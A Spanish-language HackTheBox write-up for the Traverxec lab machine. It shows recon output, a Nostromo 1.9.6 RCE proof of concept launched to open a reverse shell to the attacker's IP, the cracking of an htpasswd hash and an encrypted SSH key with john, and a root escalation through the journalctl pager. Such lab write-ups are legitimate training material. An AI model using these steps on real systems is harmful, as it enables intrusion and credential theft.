---
tags:
title: Traverxec - Easy (HTB)
toc: true
permalink: /Traverxec-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
# Recon

```bash
nmapf 10.129.203.218
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 14:39 -0500
Initiating Ping Scan at 14:39
Scanning 10.129.203.218 [4 ports]
Completed Ping Scan at 14:39, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:39
Completed Parallel DNS resolution of 1 host. at 14:39, 0.50s elapsed
Initiating SYN Stealth Scan at 14:39
Scanning 10.129.203.218 [65535 ports]
Discovered open port 22/tcp on 10.129.203.218
Discovered open port 80/tcp on 10.129.203.218
Increasing send delay for 10.129.203.218 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Completed SYN Stealth Scan at 14:39, 15.78s elapsed (65535 total ports)
Nmap scan report for 10.129.203.218
Host is up, received echo-reply ttl 63 (0.62s latency).
Scanned at 2026-02-24 14:39:09 EST for 15s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 42 (4.556KB)
-e [*] IP: 10.129.203.218
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 14:39 -0500
Nmap scan report for 10.129.203.218
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:43:03 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   GenericLines:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:43:05 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:42:54 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   RTSPRequest:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:42:55 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.98%I=7%D=2/24%Time=699DFE7D%P=x86_64-pc-linux-gnu%r(HTTP
SF:Options,186,"HTTP/1\.1\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2
SF:024\x20Feb\x202026\x2019:42:54\x20GMT\r\nServer:\x20nostromo\x201\.9\.6
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<!DOCTYPE
SF:\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//E
SF:N\">\n<html>\n<head>\n<title>501\x20Not\x20Implemented</title>\n<meta\x
SF:20http-equiv=\"content-type\"\x20content=\"text/html;\x20charset=iso-88
SF:59-1\">\n</head>\n<body>\n\n<h1>501\x20Not\x20Implemented</h1>\n\n<hr>\
SF:n\n</body>\n</html>")%r(RTSPRequest,186,"HTTP/1\.1\x20501\x20Not\x20Imp
SF:lemented\r\nDate:\x20Tue,\x2024\x20Feb\x202026\x2019:42:55\x20GMT\r\nSe
SF:rver:\x20nostromo\x201\.9\.6\r\nConnection:\x20close\r\nContent-Type:\x
SF:20text/html\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
SF:\x204\.01\x20Transitional//EN\">\n<html>\n<head>\n<title>501\x20Not\x20
SF:Implemented</title>\n<meta\x20http-equiv=\"content-type\"\x20content=\"
SF:text/html;\x20charset=iso-8859-1\">\n</head>\n<body>\n\n<h1>501\x20Not\
SF:x20Implemented</h1>\n\n<hr>\n\n</body>\n</html>")%r(FourOhFourRequest,1
SF:86,"HTTP/1\.1\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2024\x20Fe
SF:b\x202026\x2019:43:03\x20GMT\r\nServer:\x20nostromo\x201\.9\.6\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<ht
SF:ml>\n<head>\n<title>501\x20Not\x20Implemented</title>\n<meta\x20http-eq
SF:uiv=\"content-type\"\x20content=\"text/html;\x20charset=iso-8859-1\">\n
SF:</head>\n<body>\n\n<h1>501\x20Not\x20Implemented</h1>\n\n<hr>\n\n</body
SF:>\n</html>")%r(GenericLines,186,"HTTP/1\.1\x20501\x20Not\x20Implemented
SF:\r\nDate:\x20Tue,\x2024\x20Feb\x202026\x2019:43:05\x20GMT\r\nServer:\x2
SF:0nostromo\x201\.9\.6\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.0
SF:1\x20Transitional//EN\">\n<html>\n<head>\n<title>501\x20Not\x20Implemen
SF:ted</title>\n<meta\x20http-equiv=\"content-type\"\x20content=\"text/htm
SF:l;\x20charset=iso-8859-1\">\n</head>\n<body>\n\n<h1>501\x20Not\x20Imple
SF:mented</h1>\n\n<hr>\n\n</body>\n</html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.21 seconds
```
## Website

La pagina principal no muestra nada de nada.

![image-center](/assets/images/Pasted image 20260224165155.png)
## Shell as www-data
### Nostromo RCE

Como el escaneo de `nmap` me mostro que corre `nostromo`, mas en concreto la versión `1.9.6`, busque exploits asociados a esta versión , [encontrando uno](https://github.com/cancela24/CVE-2019-16278-Nostromo-1.9.6-RCE) y así lo baje con el parámetro `-m`.
### Shell

Luego de clonarme el repositorio, solo tenia que rellenar los parámetros junto con la `ip` de la victima y la mía.

```bash
python3 poc.py -t 10.129.203.218 -p 80 --attacker-port 4444 --attacker-ip 10.10.17.19
[!] Make sure to start a listener on your attacking machine with the command:
 nc -lvnp 4444

[-] Sending payload to the server...: No response received. Retrying...
[+] Opening connection to 10.129.203.218 on port 80: Done
[*] Closed connection to 10.129.203.218 port 80
[*] Retrying (1/3)..
```

Y desde mi listener `nc` recibí la conexión como el usuario `www-data`.

```BASH
 sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.203.218] 44138
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
### Shell as david

Viendo uno de los dos archivos en /var/nostromo/conf, veo que en el directorio del usuario `david`, hay una carpeta con el nombre `public_www`.

```BASH
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]
<SNIP>
# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```
### Login fail

Además hay un archivo con el hash `md5crypt` del password de este usuario.

```BASH
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
### Crack password

El mismo lo rompí con `john`.

```bash
j hash
Created directory: /home/zsln/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:24 DONE (2026-02-24 15:19) 0.04035g/s 426893p/s 426893c/s 426893C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Y cuando me quise loguear con dicha contraseña me salía invalida por alguna razón.

```BASH
ssh david@traverxec.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
david@traverxec.htb's password:
Permission denied, please try again.
david@traverxec.htb's password:
```
### Backup file

Volviendo al directorio, contaba también con la carpeta `protected-file-area`.

```BASH
www-data@traverxec:/var/nostromo/logs$ ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

En la cual dentro de la misma habían dos archivos, uno de ellos un comprimido de un backup.

```bash
www-data@traverxec:/tmp$ ls -la ls -la /home/david/public_www/protected-file-area/
ls: cannot access 'ls': No such file or directory
/home/david/public_www/protected-file-area/:
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```
### Crack passphrase

Copie el mismo en la ruta `/tmp`, y luego lo descomprimí con `tar` y `gunzip`, viendo así la clave `rsa` del usuario `david`.

```bash
www-data@traverxec:/tmp$ file backup-ssh-identity-files.tgz
backup-ssh-identity-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size 10240
www-data@traverxec:/tmp$ gunzip backup-ssh-identity-files.tgz
www-data@traverxec:/tmp$ ls
backup-ssh-identity-files.tar  systemd-private-d014f61d6c2c4f0291215faf1f936d94-systemd-timesyncd.service-aFIeXI  vmware-root  vmware-root_387-1815350242
www-data@traverxec:/tmp$ tar -xvf backup-ssh-identity-files.tar
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub

<SNIP>
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----

```

Probando la misma, me pide una clave, en donde probé la que encontré anteriormente, pero sin éxito.

```bash
$ ssh david@traverxec.htb -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
david@traverxec.htb's password:
Permission denied, please try again.
david@traverxec.htb's password:
```

Por lo que use `ssh2john` para convertir el contenido de la misma en un hash.

```bash
ssh2john id_rsa > hash_rsa
```
### Shell

El mismo lo rompí revelando así la clave que lo desbloquea.

```bash
j hash_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:00 DONE (2026-02-24 15:41) 100.0g/s 16000p/s 16000c/s 16000C/s carolina..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Ahora si usando esta, me conecte por `ssh`.

```bash
ssh david@traverxec.htb -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$  a  cat user.txt
cdb58089f4a69ea95a79c46f7daf547f
```
## Shell as root
### Binary abuse

Viendo el directorio personal de `david`, vi que en la carpeta `/bin` hay dos archivos.
El script parece ejecutar con sudo `journalctl`, un binario que cumple casi la misma función que `systemctl`, viendo en el mismo que ejecuta `unostromo.service`, lo cual no es bueno ya que cuando el propio binario se ejecuta de forma manual, entra en formato `less` cuando las proporciones de la pantalla no son las adecuadas, permitiendo a alguien de bajos privilegios spawnear una shell como `root` ejecutando `!/bin/bash` luego de ejecutarlo manualmente.

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
### Shell

Probando mi teoría, ejecute el mismo comando, pero manualmente, viendo que entro en el formato pager o paginador de `less`, por lo que puedo simplemente ejecutar `!/bin/bash`, dándome así una shell como `root`..

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2026-02-24 14:41:14 EST, end at Tue 2026-02-24 15:49:22 EST. --
Feb 24 15:22:40 traverxec su[1048]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=ww
Feb 24 15:22:42 traverxec su[1048]: FAILED SU (to david) www-data on pts/0
Feb 24 15:22:46 traverxec su[1049]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=ww
Feb 24 15:22:48 traverxec su[1049]: FAILED SU (to david) www-data on pts/0
Feb 24 15:46:16 traverxec nhttpd[1018]: /../../../../bin/sh sent a bad cgi header
!/bin/bash

root@traverxec:~#
```

```bash
root@traverxec:~# cat root.txt
f74488...
```

`~Happy Hacking.`